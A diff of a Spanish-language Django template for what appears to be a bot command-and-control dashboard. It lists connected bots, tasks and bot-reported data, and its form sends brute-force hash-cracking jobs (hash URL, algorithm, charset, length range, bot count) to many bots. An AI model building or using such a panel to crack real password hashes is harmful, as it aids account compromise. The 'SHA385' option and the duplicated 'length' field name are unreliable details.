@@ -3,8 +3,7 @@
 {% load humanize %}
 
 {% block content %}
-<!-- Table -->
-<h2>Lista de Bots</h2>
+<h2>Lista de Bots (conectados en los últimos 10 minutos)</h2>
 <br>
 <table id="bots-table" class="table table-striped table-bordered text-nowrap" cellspacing="0" width="100%">
   <thead>
@@ -33,19 +32,46 @@
 <table id="tasks-table" class="table table-striped table-bordered text-nowrap" cellspacing="0" width="100%">
   <thead>
     <tr>
+      <th>Name</th>
       <th>Command</th>
-      <th>Bot UUID</th>
-      <th>Bot Username</th>
-      <th>Answer</th>
+      <th>Total Workers</th>
+      <th>Workers Running</th>
+      <th>Created at</th>
     </tr>
   </thead>
   <tbody>
   {% for task in tasks %}
     <tr>
+      <td>{{ task.name }}</td>
       <td>{{ task.command }}</td>
-      <td>{{ task.bot.uuid }}</td>
-      <td>{{ task.bot.username }}</td>
-      <td>{{ task.answer }}</td>
+      <td>{{ task.total_workers }}</td>
+      <td>{{ task.workers_running }}</td>
+      <td>{{ task.created_at | naturaltime }}</td>
+    </tr>
+  {% endfor %}
+  </tbody>
+</table>
+<br>
+<br>
+
+
+<h2>Lista de Reportes</h2>
+<table id="reports-table" class="table table-striped table-bordered text-nowrap" cellspacing="0" width="100%">
+  <thead>
+    <tr>
+      <th>Task Name</th>
+      <th>Bot Username</th>
+      <th>Data</th>
+      <th>Reported at</th>
+    </tr>
+  </thead>
+  <tbody>
+  {% for report in reports %}
+    <tr>
+      <td>{{ report.task.name }}</td>
+      <td>{{ report.bot.username }}</td>
+      <td>{{ report.data }}</td>
+      <td>{{ report.created_at | naturaltime }}</td>
     </tr>
   {% endfor %}
   </tbody>
@@ -57,19 +83,49 @@
 <form action="{% url 'run_command' %}" method="post">
   {% csrf_token %}
   <div class="form-group">
-    <input type="text" class="form-control" name="url" placeholder="Hashes URL (Ex: http://domain.com/hashlist.txt)">
-    <select class="form-control" name="hashing-algorithm">
-      <option>MD5</option>
-      <option>SHA1</option>
-      <option>SHA224</option>
-      <option>SHA256</option>
-      <option>SHA385</option>
-      <option>SHA512</option>
-    </select>
-    <input type="text" class="form-control" name="charset" placeholder="Character set (Ex: lLds)">
-    <input type="text" class="form-control" name="length" placeholder="Word length (Ex: 5)">
-    <input type="text" class="form-control" name="bots" placeholder="Bots (Ex: 10)">
-    <input type="submit" value="Submit" class="btn btn-primary">
+
+    <div class="row">
+
+      <div class="col">
+        <input type="text" class="form-control" name="name" placeholder="Name (Ex: Cracking Task)">
+      </div>
+      <div class="col">
+        <input type="text" class="form-control" name="url" placeholder="Hashes URL (Ex: http://domain.com/hashlist.txt)">
+      </div>
+
+      <div class="w-100"></div>
+
+      <div class="col">
+        <select class="form-control" name="hashing-algorithm">
+          <option>MD5</option>
+          <option>SHA1</option>
+          <option>SHA224</option>
+          <option>SHA256</option>
+          <option>SHA385</option>
+          <option>SHA512</option>
+        </select>
+      </div>
+      <div class="col">
+        <input type="text" class="form-control" name="charset" placeholder="Character set (Ex: lLds)">
+      </div>
+      <div class="col">
+        <input type="text" class="form-control" name="length" placeholder="Word min length (Ex: 3)">
+      </div>
+      <div class="col">
+        <input type="text" class="form-control" name="length" placeholder="Word max length (Ex: 8)">
+      </div>
+      <div class="col">
+        <input type="text" class="form-control" name="bots" placeholder="Bots (Ex: 10)">
+      </div>
+
+      <div class="w-100"></div>
+
+      <div class="col">
+        <input type="submit" value="Submit" class="btn btn-primary btn-block">
+      </div>
+
+    </div>
+
   </div>
 </form>
 
